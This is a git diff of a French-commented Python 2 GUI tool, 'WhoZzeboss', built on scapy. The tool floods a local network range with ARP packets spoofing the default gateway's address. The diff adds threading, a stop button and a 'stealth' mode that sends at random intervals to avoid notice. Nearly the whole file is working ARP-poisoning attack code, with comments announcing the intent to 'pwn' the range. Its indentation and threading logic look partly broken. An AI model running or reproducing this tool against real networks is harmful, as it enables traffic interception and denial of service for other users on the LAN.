@@ -1,8 +1,12 @@
 from scapy.all import *
 from Tkinter import *
-import socket, struct
+import socket, struct, threading, time, random
+import threading
 
-#Lecture de la gateway sur linux
+
+	
+
+		#Lecture de la gateway sur linux
 def get_default_gateway_linux():
 	with open("/proc/net/route") as fh:
 		for line in fh:
@@ -19,33 +23,55 @@ network = str(net1) + '.' + str(net2) + '.' + str(net3) + '.'
 #definition de la range complete
 rangenetall = network + '1-254'
 
+class pwnth(threading.Thread):
+    def __init__(self):
+        super(pwnth, self).__init__()
+        self._arret = threading.Event()
+
+    def arret(self):
+        self._arret.set()
+
+    def arrete(self):
+        return self._arret.isSet()
+		
 #fonction pour envoyer le paquet ARP a toute la range en utilisant scapy
-def pwnall():
-	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
-	print "Je pownerai cet intervalle : " + rangenetall
-	sendp(a,loop=1)
+	def pwnall(self):
+		a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
+		print "Je pownerai cet intervalle : " + rangenetall
+		self.start()
+		while not self._arret.isSet():
+			sendp(a)
 
 #fonction pour envoyer le paquet ARP a une range specifique en utilisant scapy
-def pwncust(premadr,dernadr):
-	rangecust = network + premadr + "-" + dernadr
-	print "Je pownerai cet intervalle : " + rangecust
-	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
-	#sendp(a,inter=RandNum(2,10),loop=1)
-	sendp(a,loop=1)
-
+	def pwncust(self,premadr,dernadr):
+		rangecust = network + premadr + "-" + dernadr
+		print "Je pownerai cet intervalle : " + rangecust
+		b=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
+		self.start()
+		#sendp(a,inter=RandNum(2,10),loop=1)
+		while not self._arret.isSet():
+			sendp(b)
 #IDEM en mode discret
-def pwnallstlh():
-	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
-	print "Je pownerai cet intervalle : " + rangenetall
-	sendp(a,inter=RandNum(2,10),loop=1)
-
+	def pwnallstlh(self):
+		c=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
+		print "Je pownerai cet intervalle : " + rangenetall
+		self.start()
+		while not self._arret.isSet():
+			time.sleep(random.randrange(2,10))
+			sendp(c)
+			
 	#IDEM en mode discret
-def pwncuststlh(premadr,dernadr):
-	rangecust = network + premadr + "-" + dernadr
-	print "Je pownerai cet intervalle : " + rangecust
-	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
-	sendp(a,inter=RandNum(2,10),loop=1)
-	
+	def pwncuststlh(self,premadr,dernadr):
+		rangecust = network + premadr + "-" + dernadr
+		print "Je pownerai cet intervalle : " + rangecust
+		d=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
+		self.start()
+		while not self._arret.isSet():
+			time.sleep(random.randrange(2,10))
+			sendp(d)
+		
+p = pwnth()
+
 # creation de l'interface graphique utilisant Tkinter
 root = Tk()
 root.title("WhoZzeboss")
@@ -73,28 +99,28 @@ def action():
 	#cas avec la case de la derniere adresse etant vide
 		if not case_dernadr.get():
 			if stlh.get():
-				pwncuststlh(case_premadr.get(),case_premadr.get())
+				p.pwncuststlh(case_premadr.get(),case_premadr.get())
 			else:
-				pwncust(case_premadr.get(),case_premadr.get())
+				p.pwncust(case_premadr.get(),case_premadr.get())
 		
 	#cas avec la case de la derniere adresse remplie
 		else:
 			if stlh.get():
-				pwncuststlh(case_premadr.get(),case_dernadr.get())
+				p.pwncuststlh(case_premadr.get(),case_dernadr.get())
 			else:
-				pwncust(case_premadr.get(),case_dernadr.get())
+				p.pwncust(case_premadr.get(),case_dernadr.get())
 #cas avec case de customisation de la range non cochee : lancement de la fonction pour la range de tout le reseau
 	else:
 		if stlh.get():
-			pwnallstlh()
+			p.pwnallstlh()
 		else:
-			pwnall()
+			p.pwnall()
 #redefinition du texte du bas de la fenetre
 	result["text"] = "Spawnage off"
 
-#creation du bouton
+#creation du bouton d'action
 submit_button = Button(app,text = msgbttn, command = action)
-
+stop_button = Button(app,text = "stop", command = p.arret)
 #####
 #creation de la fonction qui definit le comportement du programme en fonction de l'etat de la case a cocher
 
@@ -146,6 +172,7 @@ result.grid(row = 4, column = 0)
 checkchoix.grid(row = 2, column = 0, sticky = W)
 checkstlh.grid(row = 0, column = 0, sticky = W)
 submit_button.grid(row = 3, column = 0, sticky = W)
+stop_button.grid(row = 3, column = 1, sticky = W)
 
 #boucle Tkinter permettant l'execution de l'interface graphique
 root.mainloop()
